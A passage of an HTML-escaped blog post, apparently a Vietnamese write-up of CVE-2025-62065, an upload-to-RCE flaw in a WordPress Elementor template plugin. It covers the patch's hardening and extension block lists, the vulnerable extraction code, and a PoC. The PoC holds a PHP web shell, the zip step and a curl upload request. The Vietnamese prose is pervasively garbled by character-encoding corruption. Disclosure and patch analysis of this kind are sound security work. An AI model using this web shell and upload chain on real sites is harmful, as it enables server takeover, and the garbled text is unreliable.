&lt;code&gt;.../rometheme_template/tmp/&lt;/code&gt; l√†m n∆°i l∆∞u t·∫°m, kh√¥ng tr·∫£ URL public cho file t·∫°m.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;T·∫°o &lt;code&gt;.htaccess&lt;/code&gt; ƒë·ªÉ ch·∫∑n th·ª±c thi:&lt;/strong&gt; khi t·∫°o base dir, ghi &lt;code&gt;.htaccess&lt;/code&gt; c√≥ &lt;code&gt;Deny from all&lt;/code&gt; / &lt;code&gt;FilesMatch &amp;quot;\.(php|phtml|phar)$&amp;quot;&lt;/code&gt; ƒë·ªÉ ngƒÉn Apache/PHP th·ª±c thi c√°c file nguy hi·ªÉm.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;T√™n file t·∫°m ng·∫´u nhi√™n:&lt;/strong&gt; d√πng &lt;code&gt;wp_generate_password(12, false)&lt;/code&gt; ƒë·∫∑t t√™n file nh∆∞ &lt;code&gt;upload_&amp;lt;random&amp;gt;.zip&lt;/code&gt; ‚Üí gi·∫£m kh·∫£ nƒÉng ƒëo√°n/truy c·∫≠p.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;X√≥a file t·∫°m sau x·ª≠ l√Ω:&lt;/strong&gt; v·∫´n unlink zip sau khi x·ª≠ l√Ω; nay file n·∫±m trong khu v·ª±c kh√¥ng public tr∆∞·ªõc khi x√≥a.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Thay h√†m gi·∫£i n√©n b·∫±ng &lt;code&gt;template_extract_secure()&lt;/code&gt;:&lt;/strong&gt; h√†m m·ªõi ch·ª©a nhi·ªÅu ki·ªÉm tra an to√†n tr∆∞·ªõc v√† trong khi gi·∫£i n√©n:&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Ki·ªÉm tra v·ªã tr√≠ file ZIP:&lt;/strong&gt; &lt;code&gt;realpath()&lt;/code&gt; v√† so s√°nh v·ªõi &lt;code&gt;WP_CONTENT_DIR&lt;/code&gt; ƒë·ªÉ ƒë·∫£m b·∫£o zip n·∫±m trong th∆∞ m·ª•c h·ª£p l·ªá.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;T·∫°o th∆∞ m·ª•c ƒë√≠ch &amp;amp; b·∫£o v·ªá root:&lt;/strong&gt; t·∫°o base dir v√† &lt;code&gt;index.html&lt;/code&gt; ·ªü target ƒë·ªÉ tr√°nh directory listing; t·∫°o &lt;code&gt;.htaccess&lt;/code&gt; ·ªü base dir.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;M·ªü ZIP an to√†n:&lt;/strong&gt; ki·ªÉm tra &lt;code&gt;open()&lt;/code&gt; th√†nh c√¥ng, n·∫øu l·ªói tr·∫£ v·ªÅ t∆∞∆°ng ·ª©ng.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Whitelist ph·∫ßn m·ªü r·ªông:&lt;/strong&gt; ch·ªâ cho ph√©p c√°c ext an to√†n (&lt;code&gt;jpg,jpeg,png,gif,svg,webp,json,css,js,txt,html,htm,md&lt;/code&gt;).&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Ch·∫∑n path traversal &amp;amp; path tuy·ªát ƒë·ªëi:&lt;/strong&gt; t·ª´ ch·ªëi entry ch·ª©a &lt;code&gt;../&lt;/code&gt;, b·∫Øt ƒë·∫ßu b·∫±ng &lt;code&gt;/&lt;/code&gt; ho·∫∑c drive letter (Windows) ‚Üí ngƒÉn Zip Slip.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;T·ª´ ch·ªëi extension nguy hi·ªÉm:&lt;/strong&gt; n·∫øu entry c√≥ ext r·ªóng ho·∫∑c ext trong danh s√°ch ƒëen (&lt;code&gt;php,phtml,phar,exe,sh,pl,cgi&lt;/code&gt;&amp;hellip;) th√¨ ƒë√≥ng zip v√† tr·∫£ l·ªói.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Tr√°nh mismatch mime/ext:&lt;/strong&gt; d√πng &lt;code&gt;wp_check_filetype_and_ext()&lt;/code&gt;; n·∫øu mismatch (tr·ª´ json) th√¨ x√≥a file.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Scan n·ªôi dung ƒë·∫ßu file:&lt;/strong&gt; ƒë·ªçc 512 bytes ƒë·∫ßu; n·∫øu th·∫•y &lt;code&gt;&amp;lt;?php&lt;/code&gt; th√¨ x√≥a file ƒë√≥.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Gi·∫£i n√©n t·ª´ng file b·∫±ng stream:&lt;/strong&gt; ghi t·ª´ng entry v√†o ƒë∆∞·ªùng d·∫´n ƒë√£ normalize v√† sanitize (&lt;code&gt;sanitize_file_name(basename(...))&lt;/code&gt;) thay v√¨ extractTo tr·ª±c ti·∫øp.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;C·∫≠p nh·∫≠t option an to√†n h∆°n:&lt;/strong&gt; l∆∞u &lt;code&gt;$hashId&lt;/code&gt; c√πng timestamp &lt;code&gt;created&lt;/code&gt; v√†o &lt;code&gt;rtm_template_installed&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Tr·∫£ v·ªÅ/ƒëi·ªÅu khi·ªÉn l·ªói r√µ r√†ng:&lt;/strong&gt; nhi·ªÅu &lt;code&gt;wp_send_json_error()&lt;/code&gt; v·ªõi m√£ tr·∫°ng th√°i/mesage c·ª• th·ªÉ khi g·∫∑p v·∫•n ƒë·ªÅ (file not found, invalid zip, disallowed types&amp;hellip;).&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;=&amp;gt; Gi·∫£m m·∫°nh m·ªçi r·ªßi ro t·∫•n c√¥ng th√¥ng qua upload ZIP, kh√¥ng th·ªÉ RCE&lt;/p&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;vulnerable-code&#34;&gt;&lt;span&gt;Vulnerable Code&lt;/span&gt;&#xA;  &lt;a href=&#34;#vulnerable-code&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;Trong phi√™n b·∫£n l·ªói, H√†m nh·∫≠n m·ªôt file upload(k·ª≥ v·ªçng &lt;code&gt;.zip&lt;/code&gt;), l∆∞u t·∫°m v√†o th∆∞ m·ª•c &lt;code&gt;uploads/&lt;/code&gt;, sau ƒë√≥ g·ªçi &lt;code&gt;template_extract()&lt;/code&gt; ƒë·ªÉ t·∫£i l·∫°i v√† gi·∫£i n√©n n√≥. Cu·ªëi c√πng x√≥a file t·∫°m v√† tr·∫£ JSON &lt;code&gt;success/fail&lt;/code&gt;. C·ª• th·ªÉ:&lt;/p&gt;&#xA;&lt;ol&gt;&#xA;&lt;li&gt;&lt;code&gt;check_ajax_referer(&#39;rtm_template_nonce&#39;, &#39;nonce&#39;)&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;p&gt;Gi√∫p b·∫£o v·ªá tr∆∞·ªõc &lt;code&gt;CSRF&lt;/code&gt; - ƒë·∫£m b·∫£o request AJAX h·ª£p l·ªá v√† c√≥ &lt;code&gt;nonce&lt;/code&gt;. Khi search v·ªõi t·ª´ kh√≥a &lt;code&gt;rtm_template_nonce&lt;/code&gt; trong th∆∞ m·ª•c plugin:&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-04-cve-2025-62065/nonce_create.png&#34; title=&#34;C√°ch nonce c√≥ action rtm_template_nonce ƒë∆∞·ª£c t·∫°o&#34; data-thumbnail=&#34;/posts/2025-11-04-cve-2025-62065/nonce_create.png&#34; data-sub-html=&#34;&lt;h2&gt;Nonce Create&lt;/h2&gt;&lt;p&gt;C√°ch nonce c√≥ action rtm_template_nonce ƒë∆∞·ª£c t·∫°o&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-04-cve-2025-62065/nonce_create.png&#39; alt=&#34;Nonce Create&#34; height=&#34;572&#34; width=&#34;1790&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;C√°ch nonce c√≥ action rtm_template_nonce ƒë∆∞·ª£c t·∫°o&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;code&gt;wp_localize_script()&lt;/code&gt; s·∫Ω in m·ªôt ƒëo·∫°n &lt;code&gt;&amp;lt;script&amp;gt;&lt;/code&gt; inline v√†o trang v√† trong ƒë√≥ khai b√°o m·ªôt bi·∫øn JS (object) ch·ª©a d·ªØ li·ªáu ƒë∆∞·ª£c truy·ªÅn v√†o. Trong tr∆∞·ªùng h·ª£p n√†y, object l√† &lt;code&gt;rkit_libs&lt;/code&gt; l∆∞u tr·ªØ c√°c gi√° tr·ªã &lt;code&gt;logo_url&lt;/code&gt;, &lt;code&gt;ajax_url&lt;/code&gt;, &lt;code&gt;template_nonce&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;div class=&#34;alert alert-tip&#34;&gt;&lt;p class=&#34;alert-title&#34;&gt;&lt;svg class=&#34;icon&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34; viewBox=&#34;0 0 16 16&#34; width=&#34;16&#34; height=&#34;16&#34;&gt;&lt;path d=&#34;M8 1.5c-2.363.0-4 1.69-4 3.75.0.984.424 1.625.984 2.304l.214.253c.223.264.47.556.673.848.284.411.537.896.621 1.49a.75.75.0 01-1.484.211c-.04-.282-.163-.547-.37-.847a8.456 8.456.0 00-.542-.68c-.084-.1-.173-.205-.268-.32C3.201 7.75 2.5 6.766 2.5 5.25 2.5 2.31 4.863.0 8 0s5.5 2.31 5.5 5.25c0 1.516-.701 2.5-1.328 3.259-.095.115-.184.22-.268.319-.207.245-.383.453-.541.681-.208.3-.33.565-.37.847a.751.751.0 01-1.485-.212c.084-.593.337-1.078.621-1.489.203-.292.45-.584.673-.848.075-.088.147-.173.213-.253.561-.679.985-1.32.985-2.304.0-2.06-1.637-3.75-4-3.75zM5.75 12h4.5a.75.75.0 010 1.5h-4.5a.75.75.0 010-1.5zM6 15.25a.75.75.0 01.75-.75h2.5a.75.75.0 010 1.5h-2.5A.75.75.0 016 15.25z&#34;/&gt;&lt;/svg&gt;M·∫πo&lt;/p&gt;&lt;p&gt;V√¨ l·ªó h·ªïng ƒë∆∞·ª£c c√¥ng b·ªë v·ªõi ƒë·∫∑c quy·ªÅn &lt;strong&gt;Contributor&lt;/strong&gt;, th∆∞·ªùng li√™n quan ƒë·∫øn vi·ªác t·∫°o &lt;strong&gt;post&lt;/strong&gt; n√™n ta th·ª≠ t·∫°o post v√† g·ªçi ƒë·ªëi t∆∞·ª£ng &lt;code&gt;rkit_libs&lt;/code&gt; t·ª´ console c·ªßa tr√¨nh duy·ªát ƒë·ªÉ l·∫•y gi√° tr·ªã &lt;code&gt;nonce&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;div class=&#34;details admonition info open disabled&#34;&gt;&#xA;  &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-circle-info&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Th√¥ng tin&lt;/div&gt;&#xA;  &lt;div class=&#34;details-content&#34;&gt;&#xA;    &lt;div class=&#34;admonition-content&#34;&gt;&lt;p&gt;Ta edit post b·∫±ng &lt;strong&gt;Elementor&lt;/strong&gt; , v√¨ c√°c widget c·ªßa plugin ƒë∆∞·ª£c s·ª≠ d·ª•ng b·∫±ng &lt;strong&gt;Elementor&lt;/strong&gt;, editor m·∫∑c ƒë·ªãnh kh√¥ng c√≥.&#xA;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-04-cve-2025-62065/get_nonce.png&#34; title=&#34;L·∫•y nonce t·ª´ console c·ªßa tr√¨nh duy·ªát&#34; data-thumbnail=&#34;/posts/2025-11-04-cve-2025-62065/get_nonce.png&#34; data-sub-html=&#34;&lt;h2&gt;Get Nonce&lt;/h2&gt;&lt;p&gt;L·∫•y nonce t·ª´ console c·ªßa tr√¨nh duy·ªát&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-04-cve-2025-62065/get_nonce.png&#39; alt=&#34;Get Nonce&#34; height=&#34;649&#34; width=&#34;821&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;L·∫•y nonce t·ª´ console c·ªßa tr√¨nh duy·ªát&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&lt;/div&gt;&#xA;  &lt;/div&gt;&#xA;&lt;/div&gt;&lt;/div&gt;&lt;ol start=&#34;2&#34;&gt;&#xA;&lt;li&gt;Ki·ªÉm tra &lt;code&gt;$_FILES[&#39;file&#39;]&lt;/code&gt; v√† &lt;strong&gt;extension&lt;/strong&gt;:&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;if (empty($_FILES[&amp;#39;file&amp;#39;])) {&#xA;    wp_send_json_error(&amp;#39;Tidak ada file yang diupload.&amp;#39;);&#xA;}&#xA;&#xA;$file = $_FILES[&amp;#39;file&amp;#39;];&#xA;$ext = strtolower(pathinfo($file[&amp;#39;name&amp;#39;], PATHINFO_EXTENSION));&#xA;if ($ext !== &amp;#39;zip&amp;#39;) {&#xA;    wp_send_json_error(&amp;#39;Hanya file .zip yang diperbolehkan.&amp;#39;);&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;ƒê·∫£m b·∫£o client g·ª≠i file v√† ch·ªâ cho ph√©p upload &lt;code&gt;.zip&lt;/code&gt;&lt;/p&gt;&#xA;&lt;ol start=&#34;3&#34;&gt;&#xA;&lt;li&gt;X√°c ƒë·ªãnh ƒë∆∞·ªùng d·∫´n t·∫°m v√† &lt;strong&gt;URL&lt;/strong&gt; c√¥ng khai&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;$upload_dir = wp_upload_dir();&#xA;$tmpFilePath = $upload_dir[&amp;#39;basedir&amp;#39;] . &amp;#39;/rtm_temp_&amp;#39; . wp_unique_filename($upload_dir[&amp;#39;basedir&amp;#39;], $file[&amp;#39;name&amp;#39;]);&#xA;$tmpFileUrl  = $upload_dir[&amp;#39;baseurl&amp;#39;] . &amp;#39;/&amp;#39; . basename($tmpFilePath);&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;T·∫°o t√™n file t·∫°m h·ª£p l·ªá trong th∆∞ m·ª•c &lt;strong&gt;uploads&lt;/strong&gt; v√† &lt;strong&gt;URL&lt;/strong&gt; truy c·∫≠p ƒë·∫øn file ƒë√≥, v√≠ d·ª•:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$tmpFilePath = &amp;#34;/var/www/html/wp-content/uploads/rtm_temp_filename.zip&amp;#34;&#xA;$tmpFileUrl = &amp;#34;http://localhost/wp-content/uploads/rtm_temp_filename.zip&amp;#34;&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;4&#34;&gt;&#xA;&lt;li&gt;&lt;code&gt;move_uploaded_file($file[&#39;tmp_name&#39;], $tmpFilePath)&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;p&gt;Di chuy·ªÉn file upload t·ª´ tmp PHP v√†o n∆°i t·∫°m ƒë·ªãnh nghƒ©a.&lt;/p&gt;&#xA;&lt;ol start=&#34;5&#34;&gt;&#xA;&lt;li&gt;G·ªçi &lt;code&gt;template_extract($tmpFileUrl, $file[&#39;name&#39;], true)&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;function template_extract($url, $id, $return = false)&#xA;{&#xA;    // L·∫•y th∆∞ m·ª•c upload c·ªßa WordPress v√† t·∫°o th∆∞ m·ª•c l∆∞u template&#xA;    $upload_dir = wp_upload_dir();&#xA;    $custom_dir = $upload_dir[&amp;#39;basedir&amp;#39;] . &amp;#39;/rometheme_template&amp;#39;;&#xA;    &#xA;    // T·∫°o file t·∫°m ƒë·ªÉ t·∫£i file t·ª´ URL v·ªÅ&#xA;    $tempFile = wp_tempnam($url);&#xA;&#xA;    // T·∫°o hash ID cho template&#xA;    $hashId = wp_hash($id);&#xA;    $targetDir = $custom_dir . &amp;#39;/&amp;#39; . $hashId;&#xA;&#xA;    // T·∫£i file t·ª´ URL&#xA;    $response = wp_remote_get($url, [&amp;#39;timeout&amp;#39; =&amp;gt; 300]);&#xA;&#xA;    // Ki·ªÉm tra l·ªói trong qu√° tr√¨nh t·∫£i file&#xA;    if (is_wp_error($response)) {&#xA;        wp_send_json_error($response-&amp;gt;get_error_message());&#xA;    }&#xA;&#xA;    // L∆∞u n·ªôi dung c·ªßa file ZIP v√†o file t·∫°m&#xA;    $fileContent = wp_remote_retrieve_body($response);&#xA;    file_put_contents($tempFile, $fileContent);&#xA;&#xA;    // M·ªü file ZIP v√† gi·∫£i n√©n v√†o th∆∞ m·ª•c m·ª•c ti√™u&#xA;    $zip = new ZipArchive();&#xA;    if ($zip-&amp;gt;open($tempFile) === TRUE) {&#xA;        wp_mkdir_p($targetDir);  // T·∫°o th∆∞ m·ª•c n·∫øu ch∆∞a c√≥&#xA;        $zip-&amp;gt;extractTo($targetDir);  // Gi·∫£i n√©n v√†o th∆∞ m·ª•c m·ª•c ti√™u&#xA;        $zip-&amp;gt;close();&#xA;        unlink($tempFile);  // X√≥a file t·∫°m&#xA;&#xA;        // C·∫≠p nh·∫≠t t√πy ch·ªçn &amp;#39;rtm_template_installed&amp;#39; trong database&#xA;        $option = get_option(&amp;#39;rtm_template_installed&amp;#39;, []);&#xA;        if (!is_array($option)) {&#xA;            $option = [];&#xA;        }&#xA;        $option[$hashId] = [&amp;#39;template_id&amp;#39; =&amp;gt; $id];&#xA;        update_option(&amp;#39;rtm_template_installed&amp;#39;, $option);&#xA;&#xA;        // Tr·∫£ v·ªÅ k·∫øt qu·∫£&#xA;        if ($return) {&#xA;            return true;&#xA;        } else {&#xA;            wp_send_json_success([&amp;#39;message&amp;#39; =&amp;gt; &amp;#39;success extract&amp;#39;, &amp;#39;template&amp;#39; =&amp;gt; $hashId]);&#xA;        }&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;details admonition info open disabled&#34;&gt;&#xA;  &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-circle-info&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Th√¥ng tin&lt;/div&gt;&#xA;  &lt;div class=&#34;details-content&#34;&gt;&#xA;    &lt;div class=&#34;admonition-content&#34;&gt;&lt;p&gt;·ªû ƒë√¢y file kh√¥ng ƒë∆∞·ª£c gi·∫£i n√©n th·∫≥ng n√™n kh√¥ng th·ªÉ s·ª≠ d·ª•ng k·ªπ thu·∫≠t &lt;strong&gt;Zip Slip&lt;/strong&gt; ƒë·ªÉ di chuy·ªÉn file v√†o th∆∞ m·ª•c cao h∆°n.&lt;/p&gt;&#xA;&lt;p&gt;Cu·ªëi c√πng file ƒë∆∞·ª£c l∆∞u trong trong &lt;code&gt;{wp_upload_dir}/rometheme_template/{hashId}/&lt;/code&gt;&lt;/p&gt;&lt;/div&gt;&#xA;  &lt;/div&gt;&#xA;&lt;/div&gt;&lt;ol start=&#34;6&#34;&gt;&#xA;&lt;li&gt;Tr·∫£ v·ªÅ JSON&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;hr&gt;&#xA;&lt;p&gt;&lt;code&gt;rtm_handle_upload_template()&lt;/code&gt; ƒë∆∞·ª£c ƒëƒÉng k√Ω l√†m callback cho action hook:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;add_action(&amp;#39;wp_ajax_rtm_handle_upload_template&amp;#39;, [$this, &amp;#39;rtm_handle_upload_template&amp;#39;]);&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;C√≥ nghƒ©a l√†: Khi ng∆∞·ªùi d√πng g·ª≠i y√™u c·∫ßu AJAX ƒë·∫øn &lt;code&gt;wp-admin/admin-ajax.php&lt;/code&gt; v·ªõi &lt;code&gt;action=rtm_handle_upload_template&lt;/code&gt;, h√†m &lt;code&gt;rtm_handle_upload_template()&lt;/code&gt; s·∫Ω ƒë∆∞·ª£c g·ªçi ƒë·ªÉ x·ª≠ l√Ω y√™u c·∫ßu.&lt;/p&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;pre&gt;&lt;code&gt;graph LR;&#xA;A[POST REQUEST /wp-admin/admin-ajax.php?action=rtm_handle_upload_template] --&amp;gt; B[&amp;#34;rtm_handle_upload_template()&amp;#34;]&#xA;B --&amp;gt; C{is .zip extension}&#xA;C --&amp;gt;|True| D{&amp;#34;check_ajax_referer()&amp;#34;}&#xA;C --&amp;gt;|False| E[&amp;#34;wp_send_json_error()&amp;#34;]&#xA;D --&amp;gt;|True| F[&amp;#34;template_extract()&amp;#34;]&#xA;D --&amp;gt;|False| G[Return 401]&#xA;F --&amp;gt;|Extract To| H[&amp;#34;{wp_upload_dir}/rometheme_template/{hashId}/&amp;#34;]&lt;/code&gt;&lt;/pre&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;exploit&#34;&gt;&lt;span&gt;Exploit&lt;/span&gt;&#xA;  &lt;a href=&#34;#exploit&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;ol&gt;&#xA;&lt;li&gt;ƒêƒÉng nh·∫≠p b√†i t√†i kho·∫£n &lt;strong&gt;Contributor&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;T·∫°o post v√† edit b·∫±ng &lt;strong&gt;Elementor&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;G·ªçi &lt;code&gt;rkit_libs.template_nonce&lt;/code&gt; ƒë·ªÉ l·∫•y nonce&lt;/li&gt;&#xA;&lt;li&gt;T·∫°o file ƒë·ªÉ RCE&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;&amp;lt;?php system($_GET[&amp;#39;cmd&amp;#39;]) ?&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;5&#34;&gt;&#xA;&lt;li&gt;N√©n file v·ª´a t·∫°o&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;zip rce.zip rce.php&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;6&#34;&gt;&#xA;&lt;li&gt;G·ª≠i request upload file&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;curl -X POST &amp;#34;http://localhost/wp-admin/admin-ajax.php&amp;#34; \&#xA;  -b &amp;#34;your_cookie&amp;#34; \&#xA;  -F &amp;#34;action=rtm_handle_upload_template&amp;#34; \&#xA;  -F &amp;#34;nonce=your_nonce&amp;#34; \&#xA;  -F &amp;#34;file=@rce.zip;filename=rce.zip;type=application/zip&amp;#34;&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;7&#34;&gt;&#xA;&lt;li&gt;Truy c·∫≠p file v·ª´a upload&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-04-cve-2025-62065/result.png&#34; title=&#34;RCE v·ªõi file upload&#34; data-thumbnail=&#34;/posts/2025-11-04-cve-2025-62065/result.png&#34; data-sub-html=&#34;&lt;h2&gt;Result&lt;/h2&gt;&lt;p&gt;RCE v·ªõi file upload&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-04-cve-2025-62065/result.png&#39; alt=&#34;Result&#34; height=&#34;106&#34; width=&#34;1193&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;RCE v·ªõi file upload&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;div class=&#34;details admonition question open disabled&#34;&gt;&#xA;  &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-regular fa-circle-question&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;C√¢u 